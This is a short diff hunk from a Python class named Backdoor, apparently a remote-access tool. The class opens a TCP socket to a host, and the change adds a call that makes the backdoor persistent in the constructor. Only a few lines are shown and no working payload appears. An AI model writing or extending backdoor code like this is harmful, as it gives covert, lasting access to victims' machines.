@@ -15,7 +15,7 @@ class Backdoor:
             socket.AF_INET,     # IPv4
             socket.SOCK_STREAM, # TCP socket
         )
-             
+        self.become_persistent()
         self.host, self.listener = host,listener
         
     
